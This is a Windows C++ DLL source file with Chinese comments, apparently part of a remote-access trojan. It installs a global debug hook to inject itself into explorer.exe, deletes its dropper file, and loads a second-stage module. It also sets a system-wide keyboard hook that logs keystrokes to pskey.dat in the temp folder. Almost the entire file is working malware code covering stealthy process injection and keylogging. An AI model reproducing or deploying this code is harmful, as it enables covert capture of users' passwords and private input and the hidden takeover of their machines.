
#include "stdafx.h"
//#include"afxstat_.h"
#include "SshWork.h"
#include <Tlhelp32.h>

#pragma data_seg("Shared")
char   m_CharFileName[256] = {0};
HHOOK  g_hook = NULL;
HHOOK  g_khook = NULL;
INITDLLINFO m_InitInfo = {0};
BOOL m_IsOk = FALSE;	
#pragma data_seg()
#pragma comment(linker,"/section:Shared,rws")

HINSTANCE ghInstance = NULL;
SshWork   m_Work;

#ifdef _DEBUG
void WriteLog(char* pText)
{
	FILE *fp = fopen("c:\\1.txt","a+");
	if(fp != NULL)
	{
		strcat(pText, "\n");
		fwrite(pText , strlen(pText), 1, fp);
		fclose(fp);
	}
}
#endif

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		case DLL_PROCESS_ATTACH:
			ghInstance = (HINSTANCE) hModule;
			break;
		default : break;
    }
    return TRUE;
}
LRESULT WINAPI GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	LRESULT lResult = CallNextHookEx(g_hook, nCode, wParam, lParam);

	// 查看是否为指定进程
	if(!m_IsOk && m_InitInfo.m_ProcessId == GetCurrentProcessId())
	{
		// 找到指定进程取消hook
		m_IsOk = TRUE;
		if(g_hook) UnhookWindowsHookEx(g_hook);

		// 通知主进程退出
		HANDLE m_WaitEvent = OpenEvent(EVENT_ALL_ACCESS,FALSE, m_InitInfo.m_EventName);
		if(m_WaitEvent)	
		{
			SetEvent(m_WaitEvent);
			CloseHandle(m_WaitEvent);
		}
		Sleep(1000);

		if(m_InitInfo.m_bDelete)
			DeleteFile(m_InitInfo.m_ParentFile);
		// 装载DLL到进程
		m_Work.m_Module = LoadLibrary(m_InitInfo.m_StartFile);
		if(m_Work.m_Module) 
		{
			m_Work.StartWork(&m_InitInfo);
		}
	}
	return lResult;
}
BOOL CheckProcess(UINT &pId)
{
	HANDLE m_Sys = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(m_Sys == NULL) return FALSE;

	PROCESSENTRY32 m_Lppe = {0};
	char m_ExeName[512] = {0};
	char m_Name[256] = "EXPLORER.EXE";

	m_Lppe.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(m_Sys,&m_Lppe))
	{
		CloseHandle(m_Sys);
		return FALSE;
	}

	memset(m_ExeName,0,sizeof(m_ExeName));
	strcpy(m_ExeName,m_Lppe.szExeFile);
	_strupr(m_ExeName);

	if(strstr(m_ExeName,m_Name))
	{	
		pId = m_Lppe.th32ProcessID;
		CloseHandle(m_Sys);
		return TRUE;
	}
 
	while(Process32Next(m_Sys,&m_Lppe))
	{
		memset(m_ExeName,0,sizeof(m_ExeName));
		strcpy(m_ExeName,m_Lppe.szExeFile);
		_strupr(m_ExeName);
		if(strstr(m_ExeName,m_Name))
		{	
			pId = m_Lppe.th32ProcessID;
			CloseHandle(m_Sys);
	
			return TRUE;
		}
	}
  
	CloseHandle(m_Sys);
	return FALSE;
}

BOOL PlayWork(LPINITDLLINFO pInitInfo)
{
	// 拷贝数据
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());
	memcpy(&m_InitInfo,pInitInfo,sizeof(INITDLLINFO));
    CheckProcess(m_InitInfo.m_ProcessId);

	// 自进程启动
	if(pInitInfo->m_ProcessName[0] == 2)
	{
		m_Work.StartWork(&m_InitInfo);
		return TRUE;
	}

	// 检查是否已经启动
	if(g_hook != NULL) return FALSE;

	// 切换到桌面
	HWINSTA hWinstaCurrent = GetProcessWindowStation();
    if (hWinstaCurrent == NULL)
		return FALSE;
    HDESK hDeskCurrent = GetThreadDesktop(GetCurrentThreadId());
    if (hDeskCurrent == NULL)
		return FALSE;

	HWINSTA hWinsta = OpenWindowStation("Winsta0", FALSE,
		WINSTA_ACCESSCLIPBOARD   |
		WINSTA_ACCESSGLOBALATOMS |
		WINSTA_CREATEDESKTOP     |
		WINSTA_ENUMDESKTOPS      |
		WINSTA_ENUMERATE         |
		WINSTA_EXITWINDOWS       |
		WINSTA_READATTRIBUTES    |
		WINSTA_READSCREEN        |
		WINSTA_WRITEATTRIBUTES);
    if (hWinsta == NULL)
		return FALSE;
	
    if (!SetProcessWindowStation(hWinsta))
		return FALSE;

	HDESK hDesk = OpenDesktop("Default", 0, FALSE, MAXIMUM_ALLOWED);
	if (hDesk == NULL)
		return FALSE;
	SetThreadDesktop(hDesk);

	// 启动HOOK
	g_hook = SetWindowsHookEx(WH_DEBUG, GetMsgProc, ghInstance, 0);

	// 切换回原桌面
	SetProcessWindowStation(hWinstaCurrent);
	SetThreadDesktop(hDeskCurrent);
	CloseWindowStation(hWinsta);
	CloseDesktop(hDesk);

	return (g_hook != NULL);
}

void WriteChar(char* sText)
{
	// 加锁
	HANDLE hMetux = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "PsKey400");
	if(hMetux != NULL) 
		WaitForSingleObject(hMetux, 300);

	FILE* fp = fopen(m_CharFileName,"ab");
	if(fp != NULL)
	{
		fwrite(sText,strlen(sText),1,fp);
		fclose(fp);
	}

	// 取锁
	if(hMetux != NULL) 
	{
		ReleaseMutex(hMetux);
		CloseHandle(hMetux);
	}
}

LRESULT WINAPI GetKeyMsgProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	LRESULT lResult = CallNextHookEx(g_khook, nCode, wParam, lParam);
	char key[10] = {0};
	BYTE buffer[256] = {0};
	WORD m_wchar = 0; 
	UINT m_scan = 0;
    if ((lParam & 0x40000000) && (nCode == HC_ACTION))
	{
		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>= 0x2f ) &&(wParam<= 0x100))
		{
			if (wParam == VK_RETURN)
			{
				WriteChar("\r\n");
  			}
   			else
			{
    			GetKeyboardState(buffer);
    			m_scan = 0;
				ToAscii(wParam,m_scan,buffer , &m_wchar,0);
				key[0] = m_wchar%255;
				if(key[0] >= 32 && key[0] <= 126)
					WriteChar(key);
			}
  		}
	}
	return lResult;
}

BOOL KeyStartMyWork()
{
	if(g_khook != NULL) return FALSE;
	GetTempPath(200,m_CharFileName);
	strcat(m_CharFileName,"pskey.dat");
	g_khook = SetWindowsHookEx(WH_KEYBOARD,GetKeyMsgProc,ghInstance,0);
	return (g_khook != NULL);
}

void KeyStopMyWork()
{
	if(g_khook != NULL) UnhookWindowsHookEx(g_khook);
}

